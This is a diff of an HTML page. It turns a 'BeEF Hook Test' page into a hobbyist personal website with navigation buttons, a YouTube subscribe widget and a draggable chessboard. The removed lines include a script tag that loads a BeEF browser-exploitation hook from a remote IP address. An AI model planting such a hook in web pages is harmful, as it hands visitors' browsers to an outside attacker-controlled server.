@@ -1,12 +1,130 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+    <link rel="stylesheet"
+      href="https://unpkg.com/@chrisoakman/chessboardjs@1.0.0/dist/chessboard-1.0.0.min.css"
+      integrity="sha384-q94+BZtLrkL1/ohfjR8c6L+A6qzNH9R2hBLwyoAfu3i/WCvQjzL2RQJ3uNHDISdU"
+      crossorigin="anonymous">
+    <script src="https://code.jquery.com/jquery-3.5.1.min.js"
+        integrity="sha384-ZvpUoO/+PpLXR1lu4jmpXWu80pZlYUAfxl5NsBMWOEPSjUn/6Z/hRTt8+pR6L4N2"
+        crossorigin="anonymous"></script>
+
+<script src="https://unpkg.com/@chrisoakman/chessboardjs@1.0.0/dist/chessboard-1.0.0.min.js"
+        integrity="sha384-8Vi8VHwn3vjQ9eUHUxex3JSN/NFqUg3QbPyX8kWyb93+8AC/pPWTzj+nHtbC5bxD"
+        crossorigin="anonymous"></script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BeEF Hook Test</title>
+    <title>Alex Leu's Website: Home</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: orange;
+            font-size: 1.5rem;
+            overflow-y: auto;
+        }
+        header {
+            background-color: blue;
+            color: #fff;
+            padding: 10px 0;
+            text-align: center;
+        }
+        nav {
+            display: flex;
+            flex-direction: row;
+            justify-content: space-around;
+            background-color: dodgerblue;
+            padding: 10px;
+            text-align: center;
+        }
+        nav a {
+            color: #fff;
+            margin: 0 15px;
+            text-decoration: none;
+        }
+        nav button {
+            background-color: orange;
+            border: 3px solid;
+            border-color: blue;
+        }
+        main {
+            padding: 20px;
+        }
+        footer {
+            background-color: dodgerblue;
+            color: #fff;
+            text-align: center;
+            padding: 10px 0;
+            position: sticky;
+            bottom: 0;
+            width: 100%;
+        }
+    </style>
+    <script>
+        console.log(fetch("https://api.fungenerators.com"))
+    </script>
 </head>
 <body>
-    <h1>BeEF Hook Test</h1>
-    <script src="http://172.234.196.67:3000/hook.js"></script>
+
+    <header>
+        <h1>Welcome to my website!</h1>
+    </header>
+
+    <nav>
+        <button><a href="#about">About me</a></button>
+        <button><a href="#contact">Contact me</a></button>
+        <button><a href="#3dprint">Buy a 3D print</a></button>
+        <button><a href="#games">Games</a></button>
+        <button><a href="chess.html">Chess</a></button>
+        <button><a href="movie.html">Beetlejuice Movie</a></button>
+    </nav>
+
+    <main>
+        <h1>My channel</h1>
+        <script src="https://apis.google.com/js/platform.js"></script>
+
+        <div class="g-ytsubscribe" data-channelid="UCPjCFt5lKA9vjEW3VPyf2PA" data-layout="full" data-count="default"></div>
+    </main>
+    
+    <div id="myBoard" style="width: 400px"></div>
+<button id="startBtn">Start Position</button>
+<button id="clearBtn">Clear Board</button>
+    <br>
+    <br>
+    <br>
+    <br>
+    <br>
+    <br>
+    <br>
+    <br>
+    <br>
+    <script>
+        function pieceTheme (piece) {
+  // wikipedia theme for white pieces
+  if (piece.search(/w/) !== -1) {
+    return ""+ piece + '.png'
+    console.log(piece)
+  }
+
+  // alpha theme for black pieces
+  return '' + piece + '.png'
+  console.log(piece)
+}
+
+var config = {
+  pieceTheme: pieceTheme,
+  draggable: true,
+  dropOffBoard: 'trash',
+  sparePieces: true,
+}
+var board = Chessboard('myBoard', config)
+        
+$('#startBtn').on('click', board.start)
+$('#clearBtn').on('click', board.clear)</script>
+    <footer>
+        <p>Do you want to learn to make a website?<br> Reach out to me so I could teach you how to make a website!</p>
+    </footer>
+
 </body>
 </html>
